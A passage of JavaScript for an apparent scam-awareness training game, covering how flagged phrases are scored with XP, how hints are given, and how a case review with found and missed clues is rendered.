    el.className = (m.channel === 'sms' || m.channel === 'chat') ? 'bubble' : (m.channel === 'call' ? 'line' : (m.channel === 'web' ? 'field' : 'para'));
    if (r.kind === 'note') el.classList.add('note');
    if (m.channel === 'call') {
      const w = document.createElement('b'); w.className = 'who'; w.textContent = r.who; el.appendChild(w);
    }
    if (m.channel === 'web' && r.k) {
      const k = document.createElement('b'); k.className = 'fk'; k.textContent = r.k + ': '; el.appendChild(k);
    }
    const txt = document.createElement('span'); txt.className = 'txt';
    r.parts.forEach(p => txt.appendChild(mkSeg(p, r.kind)));
    el.appendChild(txt);
    body.appendChild(el);
  });
  box.appendChild(body);
}
 
function setFeedback(text, kind) {
  const f = $('feedback');
  f.textContent = text;
  f.className = 'feedback ' + (kind || '');
}
 
function gain(n) {
  prog.xp = Math.max(0, prog.xp + n);
  cur.xp += n;
}
 
function newCase() {
  const li = levelInfo(prog.xp);
  const msg = generate($('typeSel').value, li.level);
  caseNo += 1;
  cur = { msg, found: new Set(), wrong: new Set(), hints: 0, done: false, xp: 0, startLevel: li.level };
  $('review').classList.add('hidden');
  $('review').innerHTML = '';
  $('closeBtn').disabled = false;
  $('hintBtn').disabled = false;
  setFeedback('Tap the phrases that reveal the scam. Plain text costs you XP.', '');
  renderCase();
  updateHud();
  $('case').scrollIntoView({ block: 'start' });
}
 
function onFlag(el) {
  if (!cur || cur.done) return;
  const id = Number(el.dataset.id);
  const clue = cur.msg.byId[id];
  if (clue) {
    if (cur.found.has(id)) return;
    cur.found.add(id);
    el.classList.remove('hint');
    el.classList.add('ok');
    const tag = document.createElement('sup');
    tag.className = 'tagc';
    tag.textContent = clue.type;
    el.after(tag);
    gain(10);
    setFeedback(clue.type + ': ' + clue.why + ' (+10 XP)', 'ok');
    if (cur.found.size === cur.msg.clues.length) { updateHud(); finish('solved'); return; }
  } else {
    if (cur.wrong.has(id)) return;
    cur.wrong.add(id);
    el.classList.add('bad');
    gain(-4);
    setFeedback('Not a red flag. That part is ordinary text. (-4 XP)', 'bad');
  }
  updateHud();
}
 
function hint() {
  if (!cur || cur.done) return;
  if (cur.hints >= 2) { setFeedback('No hints left on this case.', 'bad'); return; }
  const open = cur.msg.clues.filter(c => !cur.found.has(c.id));
  if (!open.length) return;
  const c = pick(open);
  const el = document.querySelector('.seg[data-id="' + c.id + '"]');
  if (el) { el.classList.add('hint'); el.scrollIntoView({ block: 'center', behavior: 'smooth' }); }
  cur.hints += 1;
  gain(-5);
  setFeedback('Look at the pulsing text. Hint ' + cur.hints + ' of 2 used. (-5 XP)', '');
  updateHud();
}
 
function finish(status) {
  cur.done = true;
  $('closeBtn').disabled = true;
  $('hintBtn').disabled = true;
  const wrong = cur.wrong.size;
  let bonus = 0;
  if (status === 'solved') bonus = wrong === 0 ? 20 : wrong === 1 ? 10 : 0;
  if (bonus) gain(bonus);
  prog.cases += 1;
  prog.streak = (status === 'solved' && wrong <= 1) ? prog.streak + 1 : 0;
  saveProg();
 
  // reveal anything missed
  cur.msg.clues.forEach(c => {
    if (!cur.found.has(c.id)) {
      const el = document.querySelector('.seg[data-id="' + c.id + '"]');
      if (el) el.classList.add('missed');
    }
  });
 
  const li = levelInfo(prog.xp);
  const found = cur.found.size, total = cur.msg.clues.length;
  const acc = found + wrong ? Math.round((found / (found + wrong)) * 100) : 0;
  const r = $('review');
  r.innerHTML = '';
 
  if (li.level > cur.startLevel) {
    const up = document.createElement('div');
    up.className = 'levelup';
    up.textContent = 'LEVEL UP: ' + li.title + ' (Level ' + li.level + '). Harder, subtler cases unlock.';
    r.appendChild(up);
  }
 
  const head = document.createElement('div');
  head.className = 'rv-head';
  head.textContent = status === 'solved' ? 'Case solved' : 'Case closed';
  r.appendChild(head);
 
  const stats = document.createElement('div');
  stats.className = 'rv-stats';
  [['Clues found', found + ' / ' + total], ['Wrong flags', String(wrong)], ['Accuracy', acc + '%'], ['XP this case', (cur.xp >= 0 ? '+' : '') + cur.xp]].forEach(s => {
    const d = document.createElement('div');
    d.className = 'rv-stat';
    d.innerHTML = '<span class="rv-v"></span><span class="rv-l"></span>';
    d.firstChild.textContent = s[1]; d.lastChild.textContent = s[0];
    stats.appendChild(d);
  });
  r.appendChild(stats);
 
  const list = document.createElement('div');
  list.className = 'rv-list';
  cur.msg.clues.forEach(c => {
    const ok = cur.found.has(c.id);
    const it = document.createElement('div');
    it.className = 'rv-item ' + (ok ? 'ok' : 'miss');
    const top = document.createElement('div'); top.className = 'rv-top';
    const pill = document.createElement('span'); pill.className = 'pill'; pill.textContent = c.type;
    const st = document.createElement('span'); st.className = 'rv-status'; st.textContent = ok ? 'Found' : 'Missed';
    top.appendChild(pill); top.appendChild(st);
    const q = document.createElement('div'); q.className = 'rv-q'; q.textContent = c.text;
    const w = document.createElement('div'); w.className = 'rv-why'; w.textContent = c.why;
    it.appendChild(top); it.appendChild(q); it.appendChild(w);
    list.appendChild(it);
  });
  r.appendChild(list);
 
  const oob = document.createElement('div');
  oob.className = 'rv-oob';
  const oh = document.createElement('b'); oh.textContent = cur.msg.oob.head + ': ';
  oob.appendChild(oh); oob.appendChild(document.createTextNode(cur.msg.oob.text));
  r.appendChild(oob);
 
  const nxt = document.createElement('button');
  nxt.className = 'btn primary block';
  nxt.textContent = 'Next case';
  nxt.addEventListener('click', newCase);
  r.appendChild(nxt);
 
  r.classList.remove('hidden');
  setFeedback(status === 'solved' ? 'All clues found. Review the case file below.' : 'Case closed. Missed clues are outlined in the message.', status === 'solved' ? 'ok' : '');
  updateHud();
  r.scrollIntoView({ block: 'start', behavior: 'smooth' });
}
 
function init() {
  prog = loadProg();
  initTypeSelect();
  $('typeSel').addEventListener('change', newCase);
  $('newBtn').addEventListener('click', newCase);
  $('hintBtn').addEventListener('click', hint);
  $('closeBtn').addEventListener('click', () => { if (cur && !cur.done) finish('closed'); });
  const msgBox = $('msg');
  msgBox.addEventListener('click', e => { const s = e.target.closest('.seg'); if (s) onFlag(s); });
  msgBox.addEventListener('keydown', e => {
    if (e.key !== 'Enter' && e.key !== ' ') return;
    const s = e.target.closest('.seg');
    if (s) { e.preventDefault(); onFlag(s); }
  });
  let armed = false;
  $('resetBtn').addEventListener('click', () => {
    if (!armed) { armed = true; $('resetBtn').textContent = 'Tap again to confirm'; setTimeout(() => { armed = false; $('resetBtn').textContent = 'Reset progress'; }, 3000); return; }
    prog = { xp: 0, cases: 0, streak: 0 }; saveProg(); armed = false; $('resetBtn').textContent = 'Reset progress'; newCase();
  });
  newCase();
}
 
if (typeof document !== 'undefined' && document.getElementById && document.getElementById('app')) init();
if (typeof module !== 'undefined' && module.exports) module.exports = { generate, TYPES, levelInfo, tierFor };
